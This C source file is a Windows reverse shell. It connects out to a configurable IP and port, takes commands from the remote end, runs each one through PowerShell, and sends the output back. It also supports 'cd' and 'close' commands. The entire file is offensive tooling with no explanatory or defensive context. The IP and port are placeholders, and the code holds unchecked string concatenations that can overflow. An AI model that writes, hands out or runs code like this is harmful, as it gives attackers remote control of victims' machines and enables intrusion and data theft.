#include <stdio.h>  
#include <winsock2.h>
#include <windows.h>
#include <unistd.h>

#pragma comment(lib,"ws2_32.lib")

void conn(char ip[], int port);

void main()  
{
    conn("ip", port);
}

void conn(char ip[], int port)
{
    WSADATA wsa;
    struct sockaddr_in shell;
    SOCKET s;
    char data[1024];
    char sh[] = "\n[*] >> ";
    PROCESS_INFORMATION pi;
    STARTUPINFO si;

    WSAStartup(MAKEWORD(2,2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);
    shell.sin_family = AF_INET;
    shell.sin_port = htons(port);
    shell.sin_addr.s_addr = inet_addr(ip);

    connect(s, (struct sockaddr*)&shell, sizeof(shell));

    while (1)
    {
        send(s, sh, sizeof(sh), 0);
        recv(s, data, sizeof(data), 0);
        if (strncmp("close", data, 5) == 0)
        {
            char bye_mess[] = "Bye...\n";
            printf("Command is 'close'...");
            send(s, bye_mess, sizeof(bye_mess), 0);
            WSACleanup();
            close(s);
            break;
        }
        else if (strncmp("cd ", data, 3) == 0)
        {
            char *r = data;
            r += 3;
            r[strlen(r)-1] = '\0';
            printf("%s",r);
            chdir(r);
        }
        else
        {
            char result[4096] = "";
            char ps_command[100] = "powershell ";
            char buffer[1024] = "";

            data[strlen(data)-1] = '\0';

            strcat(ps_command, data);

            FILE *pipe = popen(ps_command, "r");
            while(!feof(pipe))
            {
                fgets(buffer, sizeof(buffer), pipe);
                strcat(result, buffer);
            };
            pclose(pipe);
            send(s, result, sizeof(result), 0);           
        }
    }
}
